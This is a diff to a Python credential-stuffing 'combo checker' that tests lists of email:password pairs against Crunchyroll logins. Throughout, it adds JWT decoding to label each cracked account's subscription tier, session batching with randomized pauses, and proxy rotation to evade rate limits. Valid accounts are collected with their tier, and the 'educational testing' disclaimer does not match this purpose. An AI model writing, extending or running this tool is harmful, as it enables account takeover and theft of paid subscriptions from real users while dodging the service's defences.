@@ -10,6 +10,7 @@ For personal / educational testing only. Automated checks may hit rate limits or
 from __future__ import annotations
 
 import argparse
+import base64
 import json
 import os
 import random
@@ -56,9 +57,10 @@ BACKOFF_429_SEC = [2, 4, 8, 16, 32]
 DELAY_MIN_SEC = 1.5
 DELAY_MAX_SEC = 5.0
 
-# Rotate proxy every N successful line starts (randomized per run).
-PROXY_ROTATE_MIN = 3
-PROXY_ROTATE_MAX = 6
+# Batching: reuse one HTTP session per batch, then pause + fresh session (no browser — requests.Session).
+BATCH_SIZE = 10
+BATCH_PAUSE_MIN_SEC = 8.0
+BATCH_PAUSE_MAX_SEC = 22.0
 
 MAX_ACCOUNTS_PER_RUN = 300
 
@@ -132,7 +134,127 @@ def _random_browser_headers(auth: str) -> dict[str, str]:
     }
 
 
-def _fetch_subscription_label(sess: requests.Session, access_token: str) -> str:
+def _jwt_payload_dict(jwt_str: str) -> dict:
+    try:
+        parts = jwt_str.split(".")
+        if len(parts) < 2:
+            return {}
+        payload = parts[1]
+        pad = "=" * (-len(payload) % 4)
+        raw = base64.urlsafe_b64decode(payload + pad)
+        out = json.loads(raw.decode("utf-8"))
+        return out if isinstance(out, dict) else {}
+    except (ValueError, json.JSONDecodeError, UnicodeDecodeError):
+        return {}
+
+
+def _slug_to_label(s: str) -> str:
+    s = (s or "").strip().lower().replace("-", "_").replace(" ", "_")
+    mapping = {
+        "free": "Free",
+        "fan": "Fan",
+        "mega_fan": "Mega Fan",
+        "megafan": "Mega Fan",
+        "premium": "Premium",
+        "trial": "Trial",
+        "ultimate_fan": "Ultimate Fan",
+        "family": "Family",
+        "hime": "Hime",
+        "none": "Free",
+    }
+    if s in mapping:
+        return mapping[s]
+    if "mega" in s and "fan" in s:
+        return "Mega Fan"
+    if "trial" in s:
+        return "Trial"
+    if "family" in s:
+        return "Family"
+    if "premium" in s or "paid" in s:
+        return "Premium"
+    if "free" in s:
+        return "Free"
+    return s.replace("_", " ").title() if s else ""
+
+
+def _infer_subscription_from_dict(data: dict) -> str:
+    """Best-effort label from Crunchyroll account / token JSON."""
+    if data.get("premium") is True or data.get("is_premium") is True:
+        return "Premium"
+
+    for key in (
+        "subscription_type",
+        "tier",
+        "plan",
+        "product",
+        "sku",
+        "membership_type",
+        "fan_status",
+    ):
+        v = data.get(key)
+        if isinstance(v, str) and v.strip():
+            lbl = _slug_to_label(v)
+            if lbl:
+                return lbl
+        if isinstance(v, dict):
+            for subk in ("tier", "plan", "name", "type", "code"):
+                inner = v.get(subk)
+                if isinstance(inner, str) and inner.strip():
+                    lbl = _slug_to_label(inner)
+                    if lbl:
+                        return lbl
+
+    sub = data.get("subscription") or data.get("membership")
+    if isinstance(sub, dict):
+        for subk in ("tier", "plan", "name", "type"):
+            inner = sub.get(subk)
+            if isinstance(inner, str) and inner.strip():
+                lbl = _slug_to_label(inner)
+                if lbl:
+                    return lbl
+    if isinstance(sub, str) and sub.strip():
+        return _slug_to_label(sub) or sub.strip()
+
+    blob = json.dumps(data).lower()
+    if "mega_fan" in blob or "megafan" in blob:
+        return "Mega Fan"
+    if "trial" in blob and "subscription" in blob:
+        return "Trial"
+    if "fan_membership" in blob or '"fan"' in blob:
+        if "mega" in blob:
+            return "Mega Fan"
+        return "Fan"
+    if "free" in blob and "premium" not in blob and "fan" not in blob:
+        return "Free"
+    if "premium" in blob:
+        return "Premium"
+
+    return ""
+
+
+def _fetch_subscription_label(
+    sess: requests.Session,
+    access_token: str,
+    token_body: Optional[dict] = None,
+) -> str:
+    # Hints from token response (id_token JWT, embedded objects)
+    if token_body and isinstance(token_body, dict):
+        id_tok = token_body.get("id_token")
+        if isinstance(id_tok, str) and id_tok:
+            claims = _jwt_payload_dict(id_tok)
+            label = _infer_subscription_from_dict(claims)
+            if label:
+                return label
+        for k in ("crm_profile", "account", "profile"):
+            nested = token_body.get(k)
+            if isinstance(nested, dict):
+                label = _infer_subscription_from_dict(nested)
+                if label:
+                    return label
+        label = _infer_subscription_from_dict(token_body)
+        if label:
+            return label
+
     try:
         r = sess.get(
             ACCOUNTS_ME_URL,
@@ -144,28 +266,14 @@ def _fetch_subscription_label(sess: requests.Session, access_token: str) -> str:
             timeout=20,
         )
         if r.status_code != 200:
-            return "Active"
+            return "Unknown"
         data = r.json()
         if not isinstance(data, dict):
-            return "Active"
-        if data.get("premium") is True or data.get("is_premium") is True:
-            return "Premium"
-        sub = data.get("subscription") or data.get("membership") or data.get("tier")
-        if isinstance(sub, dict):
-            name = sub.get("tier") or sub.get("plan") or sub.get("name")
-            if name:
-                return str(name)
-        if isinstance(sub, str) and sub:
-            return sub
-        # Heuristic from nested CRM / account flags
-        ext = str(data).lower()
-        if "premium" in ext or "mega_fan" in ext or "fan_membership" in ext:
-            return "Premium"
-        if "free" in ext and "premium" not in ext:
-            return "Free"
-        return "Active"
+            return "Unknown"
+        label = _infer_subscription_from_dict(data)
+        return label if label else "Active"
     except (requests.RequestException, ValueError, TypeError, json.JSONDecodeError):
-        return "Active"
+        return "Unknown"
 
 
 def check_credentials(
@@ -260,7 +368,7 @@ def check_credentials(
         )
 
     if r.status_code == 200 and isinstance(body, dict) and body.get("access_token"):
-        sub = _fetch_subscription_label(sess, str(body["access_token"]))
+        sub = _fetch_subscription_label(sess, str(body["access_token"]), body)
         return CheckResult(CheckStatus.VALID, email, password, "", sub)
 
     err = ""
@@ -309,6 +417,22 @@ def check_credentials(
     return CheckResult(CheckStatus.INVALID, email, password, err or f"HTTP {r.status_code}", "")
 
 
+def check_combo_line_with_session(
+    line: str,
+    session: requests.Session,
+    extra_delay: float = 0.0,
+) -> CheckResult:
+    """Run one check using an existing session (same TCP/cookie jar for the batch)."""
+    line = line.strip()
+    if ":" not in line:
+        return CheckResult(CheckStatus.BAD_FORMAT, "", "", f"invalid format: {line!r}", "")
+    email, password = line.split(":", 1)
+    result = check_credentials(email, password, proxies=None, session=session)
+    if extra_delay > 0:
+        time.sleep(extra_delay * random.uniform(0.85, 1.15))
+    return result
+
+
 def check_combo_line(
     line: str,
     proxy_url: Optional[str] = None,
@@ -322,7 +446,10 @@ def check_combo_line(
     sess = requests.Session()
     if proxies:
         sess.proxies.update(proxies)
-    result = check_credentials(email, password, proxies=proxies, session=sess)
+    try:
+        result = check_credentials(email, password, proxies=proxies, session=sess)
+    finally:
+        sess.close()
     if extra_delay > 0:
         time.sleep(extra_delay * random.uniform(0.85, 1.15))
     return result
@@ -345,30 +472,54 @@ def iter_checks_sequential(
     extra_delay: float = 0.0,
 ) -> Iterator[CheckResult]:
     """
-    One account at a time (no parallel bursts). Random pause between checks.
-    Rotates proxy every few lines and on errors when proxies are configured.
+    One account at a time. Random pause between checks.
+
+    Batching (HTTP session, not a browser): reuse one ``requests.Session`` for up to
+    ``BATCH_SIZE`` accounts (shared connection/cookies), then close it, pause, and open
+    a fresh session — similar to a "soft restart". Progress continues across batches.
+    Proxies rotate at each new batch and on errors when configured.
     """
     lines = _clip_lines(combos, MAX_ACCOUNTS_PER_RUN)
     cleaned = [_normalize_proxy_url(u) for u in (proxy_urls or []) if _normalize_proxy_url(u)]
-    rotate_every = random.randint(PROXY_ROTATE_MIN, PROXY_ROTATE_MAX)
     idx = 0
+    session: Optional[requests.Session] = None
 
-    for i, line in enumerate(lines):
-        if i > 0:
-            time.sleep(random.uniform(DELAY_MIN_SEC, DELAY_MAX_SEC) + max(0.0, extra_delay))
+    try:
+        for i, line in enumerate(lines):
+            if i > 0 and i % BATCH_SIZE == 0:
+                if session is not None:
+                    session.close()
+                    session = None
+                time.sleep(
+                    random.uniform(BATCH_PAUSE_MIN_SEC, BATCH_PAUSE_MAX_SEC)
+                    + max(0.0, extra_delay) * 0.35
+                )
 
-        purl: Optional[str] = None
-        if cleaned:
-            if i > 0 and i % rotate_every == 0:
+            if session is None:
+                session = requests.Session()
+                if cleaned:
+                    if i > 0:
+                        idx = (idx + 1) % len(cleaned)
+                    pd = _proxy_dict_from_url(cleaned[idx])
+                    if pd:
+                        session.proxies.update(pd)
+
+            if i > 0:
+                time.sleep(random.uniform(DELAY_MIN_SEC, DELAY_MAX_SEC) + max(0.0, extra_delay))
+
+            result = check_combo_line_with_session(line, session, extra_delay=0.0)
+
+            if result.status == CheckStatus.ERROR and cleaned:
                 idx = (idx + 1) % len(cleaned)
-            purl = cleaned[idx]
+                session.proxies.clear()
+                pd = _proxy_dict_from_url(cleaned[idx])
+                if pd:
+                    session.proxies.update(pd)
 
-        result = check_combo_line(line, proxy_url=purl, extra_delay=0.0)
-
-        if result.status == CheckStatus.ERROR and cleaned:
-            idx = (idx + 1) % len(cleaned)
-
-        yield result
+            yield result
+    finally:
+        if session is not None:
+            session.close()
 
 
 @dataclass
@@ -380,15 +531,19 @@ class RunSummary:
     bad_format: int
     seconds: float
     valid_lines: List[str]
+    valid_entries: List[Dict[str, str]]
 
 
 def build_summary(results: List[CheckResult], elapsed: float) -> RunSummary:
     counts = {CheckStatus.VALID: 0, CheckStatus.INVALID: 0, CheckStatus.ERROR: 0, CheckStatus.BAD_FORMAT: 0}
-    valid_lines: List[str] = []
+    valid_entries: List[Dict[str, str]] = []
     for r in results:
         counts[r.status] = counts.get(r.status, 0) + 1
         if r.status == CheckStatus.VALID:
-            valid_lines.append(r.combo)
+            valid_entries.append(
+                {"combo": r.combo, "subscription": (r.subscription or "").strip() or ""},
+            )
+    valid_lines = [e["combo"] for e in valid_entries]
     return RunSummary(
         total=len(results),
         valid=counts[CheckStatus.VALID],
@@ -397,6 +552,7 @@ def build_summary(results: List[CheckResult], elapsed: float) -> RunSummary:
         bad_format=counts[CheckStatus.BAD_FORMAT],
         seconds=elapsed,
         valid_lines=valid_lines,
+        valid_entries=valid_entries,
     )
 
 
@@ -410,6 +566,7 @@ def run_checks(
     """Parallel checker (CLI). Caps workers at 2 for lighter load."""
     combos_list = _clip_lines(combos, MAX_ACCOUNTS_PER_RUN)
     valid_lines: List[str] = []
+    valid_entries: List[Dict[str, str]] = []
     counts = {CheckStatus.VALID: 0, CheckStatus.INVALID: 0, CheckStatus.ERROR: 0, CheckStatus.BAD_FORMAT: 0}
     workers = max(1, min(2, max_workers))
 
@@ -427,6 +584,9 @@ def run_checks(
             counts[result.status] = counts.get(result.status, 0) + 1
             if result.status == CheckStatus.VALID:
                 valid_lines.append(result.combo)
+                valid_entries.append(
+                    {"combo": result.combo, "subscription": (result.subscription or "").strip() or ""},
+                )
             if on_result:
                 on_result(result)
 
@@ -439,6 +599,7 @@ def run_checks(
         bad_format=counts[CheckStatus.BAD_FORMAT],
         seconds=elapsed,
         valid_lines=valid_lines,
+        valid_entries=valid_entries,
     )
 
 
